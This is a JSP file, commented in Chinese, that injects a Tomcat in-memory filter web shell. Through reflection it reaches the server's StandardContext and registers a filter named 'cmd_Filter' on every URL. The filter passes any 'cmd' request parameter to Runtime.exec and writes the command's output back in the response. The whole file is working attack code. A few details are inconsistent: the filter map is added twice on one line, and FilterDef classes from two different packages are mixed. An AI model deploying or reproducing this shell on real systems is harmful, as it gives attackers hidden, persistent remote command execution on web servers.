<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page language="java" pageEncoding="UTF-8" %>
<%
        //get StandardContext
        ServletContext servletContext = request.getServletContext();//获取到applicationcontextFacade
        Field fieldApplicationContext = servletContext.getClass().getDeclaredField("context");//利用反射获取ApplicationContext对象
        fieldApplicationContext.setAccessible(true);//使私有可获取
        ApplicationContext applicationContext = (ApplicationContext) fieldApplicationContext.get(servletContext);//获取到ApplicationContext对象

        Field fieldStandardContext = applicationContext.getClass().getDeclaredField("context");//利用反射获取StandardContext对象
        fieldStandardContext.setAccessible(true);//使私有可获取
        StandardContext standardContext = (StandardContext) fieldStandardContext.get(applicationContext);//获取到StandardContext对象

        //get filterConfig
        String FilterName = "cmd_Filter";
        Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
        Configs.setAccessible(true);
        Map filterConfigs = (Map) Configs.get(standardContext);

        //definess the filter we want to inject
        if (filterConfigs.get(FilterName) == null){
                Filter filter = new Filter() {

                        @Override
                        public void init(FilterConfig filterConfig) throws ServletException {

                        }

                        @Override
                        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                                HttpServletRequest req = (HttpServletRequest) servletRequest;
                                if (req.getParameter("cmd") != null){
                                        InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
//
                                        Scanner s = new Scanner(in).useDelimiter("\\A"); //这个有点东西，直接get all，可以学习下
                                        String output = s.hasNext() ? s.next() : "xxxx";
                                        servletResponse.getWriter().write(output);

                                        return;
                                }
                                filterChain.doFilter(servletRequest,servletResponse);
                        }

                        @Override
                        public void destroy() {

                        }
                };
//反射获取FilterDef，设置filter名等参数后，调用addFilterDef将FilterDef添加
                Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                Constructor declaredConstructors = FilterDef.getDeclaredConstructor();
                org.apache.tomcat.util.descriptor.web.FilterDef o = (org.apache.tomcat.util.descriptor.web.FilterDef)declaredConstructors.newInstance();
                o.setFilter(filter);
                o.setFilterName(FilterName);
                o.setFilterClass(filter.getClass().getName());
                standardContext.addFilterDef(o);
//反射获取FilterMap并且设置拦截路径，并调用addFilterMapBefore将FilterMap添加进去
                Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                Constructor<?> declaredConstructor = FilterMap.getDeclaredConstructor();
                org.apache.tomcat.util.descriptor.web.FilterMap o1 = (org.apache.tomcat.util.descriptor.web.FilterMap)declaredConstructor.newInstance();

                o1.addURLPattern("/*");
                o1.setFilterName(FilterName);
                o1.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(o1);                standardContext.addFilterMapBefore(o1);

//反射获取ApplicationFilterConfig，构造方法将 FilterDef传入后获取filterConfig后，将设置好的filterConfig添加进去
                Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
                Constructor<?> declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class, org.apache.catalina.deploy.FilterDef.class);
                declaredConstructor1.setAccessible(true);
                org.apache.catalina.core.ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);
                filterConfigs.put(FilterName,filterConfig);
                response.getWriter().write("Success");
        }
        %>